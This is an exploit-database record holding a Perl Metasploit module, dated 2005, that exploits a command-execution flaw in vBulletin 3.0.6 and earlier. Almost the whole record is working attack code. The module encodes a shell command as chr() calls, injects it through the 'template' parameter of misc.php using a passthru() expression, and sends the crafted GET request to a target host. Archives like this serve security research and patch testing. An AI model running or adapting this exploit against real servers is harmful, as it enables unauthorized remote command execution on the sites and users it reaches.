{
  "id": "1133",
  "title": "vBulletin 3.0.6 - &#039;template&#039; Command Execution (Metasploit)",
  "cve": null,
  "vuln_type": "unknown",
  "code": "##\r\n#        Title: vBulletin <= 3.0.6 (Add Template Name in HTML Comments = Yes) command execution eXploit\r\n#    Name: php_vb3_0_6.pm\r\n# License: Artistic/BSD/GPL\r\n#         Info: trying to get the command execution exploits out of the way on milw0rm.com. M's are always good.\r\n#\r\n#\r\n#  - This is an exploit module for the Metasploit Framework, please see\r\n#     http://metasploit.com/projects/Framework for more information.\r\n##\r\n\r\npackage Msf::Exploit::php_vb3_0_6;\r\nuse base \"Msf::Exploit\";\r\nuse strict;\r\nuse Pex::Text;\r\nuse bytes;\r\n\r\nmy $advanced = { };\r\n\r\nmy $info = {\r\n        'Name'     => 'vBulletin <= 3.0.6 (Add Template Name in HTML Comments = Yes) command execution eXploit',\r\n        'Version'  => '$Revision: 1.0 $',\r\n        'Authors'  => [ 'str0ke' ],\r\n        'Arch'     => [ ],\r\n        'OS'       => [ ],\r\n        'Priv'     => 0,\r\n        'UserOpts' =>\r\n          {\r\n                'RHOST' => [1, 'ADDR', 'The target address'],\r\n                'RPORT' => [1, 'PORT', 'The target port', 80],\r\n                'VHOST' => [0, 'DATA', 'The virtual host name of the server'],\r\n                'RPATH' => [1, 'DATA', 'Path to the misc.php script', '/forum/misc.php'],\r\n                'SSL'   => [0, 'BOOL', 'Use SSL'],\r\n          },\r\n\r\n        'Description' => Pex::Text::Freeform(qq{\r\n                This module exploits a code execution flaw in vBulletin <= 3.0.6.\r\n}),\r\n\r\n        'Refs' =>\r\n          [\r\n                ['MIL', '832'],\r\n          ],\r\n\r\n        'Payload' =>\r\n          {\r\n                'Space' => 512,\r\n                'Keys'  => ['cmd', 'cmd_bash'],\r\n          },\r\n\r\n        'Keys' => ['vBulletin'],\r\n  };\r\n\r\nsub new {\r\n        my $class = shift;\r\n        my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);\r\n        return($self);\r\n}\r\n\r\nsub Exploit {\r\n        my $self = shift;\r\n        my $target_host    = $self->GetVar('RHOST');\r\n        my $target_port    = $self->GetVar('RPORT');\r\n        my $vhost          = $self->GetVar('VHOST') || $target_host;\r\n        my $path           = $self->GetVar('RPATH');\r\n        my $cmd            = $self->GetVar('EncodedPayload')->RawPayload;\r\n\r\n        # Encode the command as a set of chr() function calls\r\n        my $byte = join('.', map { $_ = 'chr('.$_.')' } unpack('C*', $cmd));\r\n\r\n        # Create the get request data\r\n        my $data = \"?do=page&template={\\${passthru($byte)}}\";\r\n\r\n        my $req =\r\n                \"GET $path$data HTTP/1.1\\r\\n\".\r\n                \"Host: $vhost:$target_port\\r\\n\".\r\n                \"Content-Type: application/html\\r\\n\".\r\n                \"Content-Length: \". length($data).\"\\r\\n\".\r\n                \"Connection: Close\\r\\n\".\r\n                \"\\r\\n\";\r\n\r\n        my $s = Msf::Socket::Tcp->new(\r\n                'PeerAddr'  => $target_host,\r\n                'PeerPort'  => $target_port,\r\n                'LocalPort' => $self->GetVar('CPORT'),\r\n                'SSL'       => $self->GetVar('SSL'),\r\n          );\r\n\r\n        if ($s->IsError){\r\n                $self->PrintLine('[*] Error creating socket: ' . $s->GetError);\r\n                return;\r\n        }\r\n\r\n        $self->PrintLine(\"[*] Sending the malicious vBulletin Get request...\");\r\n\r\n        $s->Send($req);\r\n\r\n        my $results = $s->Recv(-1, 20);\r\n        $s->Close();\r\n\r\n        return;\r\n}\r\n\r\n1;\r\n\r\n# milw0rm.com [2005-08-03]",
  "url": "https://www.exploit-db.com/exploits/1133"
}